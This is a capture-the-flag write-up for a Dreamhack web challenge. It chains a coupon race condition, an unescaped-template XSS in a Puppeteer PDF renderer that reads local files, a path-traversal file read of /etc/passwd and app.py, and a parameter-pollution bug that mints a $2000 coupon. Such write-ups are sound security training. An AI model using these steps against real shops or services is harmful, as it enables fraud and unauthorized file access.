[link](https://dreamhack.io/wargame/challenges/1235)

- in the app.js , `app.use(express.urlencoded({ extended: false }));` indecate that the application  does not  support  parsing nested object
- Since logging into the lab , i noticed that it is an e-commerce shop . There are the flag item that need to be purchased . However , the current account balance is 0 , so likely the attack path is either again access admin account or exploiting the race condition to increase the balance .
- the lab have 2 container but we only have source code of web container . 
- in the coupon.js file , i noticed a potential race condition vulnerability . ![image](https://hackmd.io/_uploads/Hy3JsHARWl.png)
- If two requests arrive within the 50ms window, the database may not have been updated yet before another request performs the validation check.
- how to use the coupon ? First, a coupon needs to be registered before it can be applied. Attempting to use a coupon from the .db file results in the message: `"Does not match the coupon you have."`, which indicates that we need to create our own coupon associated with our account.
- configure remote debug , we define `HOST:coupon-app` and `PORT:8000` . 
                          ![image](https://hackmd.io/_uploads/H1i9TrC0Wl.png)

- in the `receipt.hbs` file  ,  I noticed the use of {{{address}}}, which indicates that the `address` input is rendered without escaping and is fully trusted. This is a strong indication of a potential XSS vulnerability.
- genReceipt.js
```
const puppeteer = require("puppeteer")
const Handlebars = require("handlebars")
const { v4: uuidv4 } = require("uuid")
const fs = require("fs")
const path = require("path")

const genReceipt = async (name, email, address, product) => {
  let templateFormat = fs.readFileSync(
    path.join(__dirname, "../views/receipt.hbs"),
    { encoding: "utf8" }
  )
  const template = Handlebars.compile(templateFormat)
  const html = template({
    name: name,
    email: email,
    address: address,
    product: product,
  })
  const htmlPath = path.join(__dirname, `../../tmp/${uuidv4()}.html`)
  fs.writeFileSync(htmlPath, html)
  const url = `file://${htmlPath}`

  try {
    const browser = await puppeteer.launch({
      executablePath: "/usr/bin/google-chrome-stable",
      headless: "new",
      args: ["--no-sandbox", "--disable-gpu"],
    })
    const page = await browser.newPage()
    await page.goto(url, { timeout: 3000 })
    await page.emulateMediaType("screen")
    let options = {
      format: "A4",
    }
    const pdf = await page.pdf(options)
    await browser.close()
    fs.unlinkSync(htmlPath) // tmp file deleted
    return pdf
  } catch (error) {
    console.log("An error occurred while generating receipt: ", error)
  }
}

module.exports = { genReceipt }

```
- This file uses the Puppeteer library (a headless Chromium browser) to take HTML input and generate a PDF file for the user to download. 
- the code snippet : `const url = file://${htmlPath}` indicates that the web page is loaded by `file://` protocol . Therefore , if the web page has an XSS vulnerability , an attacker can read local file from the system .
- payload : ![image](https://hackmd.io/_uploads/r1tp220R-x.png)
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
developer:x:1001:1001:,,,:/home/developer:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
```
However , this is local file from web container , i need to read the source code of coupon-app API from the +coupon-app container.

- in the coupon.js has the snippet
```
   // router.post("/welcome", auth, async (req, res) => {
    //     const name = req.user.name
    //     try {
    //         let response = await axios.get(`http://${HOST}:${PORT}/key?file=key_0`)
    //         let key = response.data

    //         response = await axios.get(`http://${HOST}:${PORT}/get_coupon?key=${key.msg}`)
    //         let coupon = response.data
    //         if (coupon.result){
    //             db.addBalance(req.user.name, response.data.coupon_data.value).then(()=>{
    //                 return res.render("coupon", {msg: "Success.", name: name})
    //             })
    //         }
    //             return res.render("coupon", {msg: "Fail.", name: name})
    //     } catch (error) {
    //         console.log(error)
    //         return res.render("coupon", {msg: error, name: name})
    //     }
    //   })

```
- `http://${HOST}:${PORT}/key?file=key_0` may be a request used to read a file 
- payload :![image](https://hackmd.io/_uploads/ByhmeTCRZe.png)
- response : 
```
{"msg":"Key file not found.","result":false}
```
- this indicates that the file path is incorrect.
- test path traveral and Local File Inclusion:
payload : ![image](https://hackmd.io/_uploads/rkmD4a00-g.png)
```
{"msg":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/binnsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/us:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail://nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nolo:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:wwwdata:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing LManager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bu(admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:xstent:/usr/sbin/nologin\ndreamhack:x:1000:1000:,,,:/home/dreamhack:/bin/bash\nmessagebus:x:101:101::/nonexistgin\n","result":true}
```
- `dreamhack:x:1000:1000:,,,:/home/dreamhack:/bin/bash` user is added by admin , the lab is build in linux system . 
- Reading `/proc/self/cmdline` allows us to view the full command and command-line arguments used to start the process
![image](https://hackmd.io/_uploads/rk3A3aRCbe.png)
- response : `{"msg":"python3\u0000app.py\u0000","result":true}`
- read code of app.py
![image](https://hackmd.io/_uploads/r1fm060AZe.png)
- response:
```
from flask import Flask, request, send_file
from os import urandom, path
from json import loads, dumps
from hmac import new
from hashlib import sha256

app = Flask(__name__)
app.secret_key = urandom(32)

coupons_data = [
    {
        "name": "welcome",
        "value": "10",
        "admin": "1",
        "key": "a221a4d1e9f12e33cf999cf5d603ca80",
        "coupon": "34a27d00d8bc51ac025df6033ef2927ef015161dbee2c15611ec6907be04bbcf",
    },
]
suffix = 0

@app.route('/', methods=["GET"])
def show_source():
    src_path = path.abspath(__file__)
    return send_file(src_path, mimetype='text/plain')

@app.route("/generate", methods=["GET"])
def generate():
    global suffix
    suffix += 1
    secret_key = bytes.hex(urandom(16))
    
    with open(path.join("./keys/", f"key_{suffix}"), "w") as f:
        f.write(secret_key)

    data = request.args.get("data", None)
    if not data:
        return {"result": False, "msg": "data is missing."}
    
    key_value = data.split("_")

    if key_value[0] != "name" or key_value[2] != "value" or key_value[4] != "admin":
        return {"result": False, "msg": "Invalid data."}

    # BỘ LỌC CỨNG (Sẽ bị bypass bởi lỗi ghi đè Dictionary)
    if key_value[3] != "10" or key_value[5] != "0":
        key_value[3] = "10"
        key_value[5] = "0"

    
    dict_data = {key_value[i]: key_value[i + 1] for i in range(0, len(key_value), 2)}

    coupon_data_bytes = dumps(dict_data).encode()
    coupon = new(secret_key.encode(), coupon_data_bytes, sha256).hexdigest()
    
    dict_data["key"] = secret_key
    dict_data["coupon"] = coupon
    coupon_data = dict_data
    coupons_data.append(coupon_data)

    return {"result": True, "msg": "Coupon generated successfully."}

@app.route("/verify", methods=["GET"])
def verify():
    coupon = request.args.get("coupon", None)
    if not coupon:
        return {"result": False, "msg": "coupon is missing."}

    for coupon_data in coupons_data:
        coupon_value = coupon_data.get("coupon", None)
        if coupon == coupon_value:
            return {
                "result": True,
                "msg": "Coupon is valid.",
                "coupon_data": coupon_data,
            }
        else:
            pass

    return {"result": False, "msg": "Coupon is invalid."}

@app.route("/key", methods=["GET"])
def key():
    key_file = request.args.get("file")
    key = ""
    # LỖI DIRECTORY TRAVERSAL (LFI) NẰM Ở ĐÂY
    file_path = path.join("./keys/" + key_file) 
    
    try:
        with open(file_path, "r") as f:
            for line in f:
                key += line
        return {"result": True, "msg": f"{key}"}
    except FileNotFoundError:
        return {"result": False, "msg": "Key file not found."}

@app.route("/get_coupon", methods=["GET"])
def get_coupon():
    key = request.args.get("key", None)
    if not key:
        return {"result": False, "msg": "key is missing."}

    for coupon_data in coupons_data:
        key_value = coupon_data.get("key", None)
        if key == key_value:
            return {"result": True, "coupon_data": coupon_data}
        else:
            pass

    return {"result": False, "msg": "The coupon does not exist."}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```
- analysis code : 
```

key_value = data.split("_")

[0], [2], [4]
if key_value[0] != "name" or key_value[2] != "value" or key_value[4] != "admin":
    return {"result": False, "msg": "Invalid data."}


if key_value[3] != "10" or key_value[5] != "0":
    key_value[3] = "10"
    key_value[5] = "0"


dict_data = {key_value[i]: key_value[i + 1] for i in range(0, len(key_value), 2)}
```
- A logic bug caused by Parameter Pollution can be exploited by abusing the overwrite behavior of Python dictionaries to achieve a bypass.
- payload : Creating a $2000 VIP coupon using HTTP Parameter Pollution.
- ![image](https://hackmd.io/_uploads/HkB_f0C0bg.png)
response : `{"msg":"Coupon generated successfully.","result":true}`
- payload : Leaking the newly generated key.
response : `{"msg":"14b1dc10a38cd371d4d21a4f3983b778","result":true}`
- payload : Exchanging the key to obtain the coupon hash.
![image](https://hackmd.io/_uploads/H1YcX0C0-x.png)
response: `{"coupon_data":
{"admin":"1","coupon":"833a58b56850980453535ff76e100daf3a210c94cc01ff98e6f3c
e408fa5d20b","key":"14b1dc10a38cd371d4d21a4f3983b778","name":"hacker","value
":"2000"},"result":true}`

- final:
    - Activating the coupon: Send the hash string to the `POST /coupon/register` endpoint. The system will return `"Success"` because this coupon already exists as a valid entry in the black-box database.

    - Funding the balance (Race Condition): Switch to the `POST /coupon/use` endpoint. Then, use Turbo Intruder to send multiple requests simultaneously using the `$2000` coupon hash.
    - Purchasing the flag: Once the balance is sufficient, return to the homepage and purchase the /flag item priced at $13377.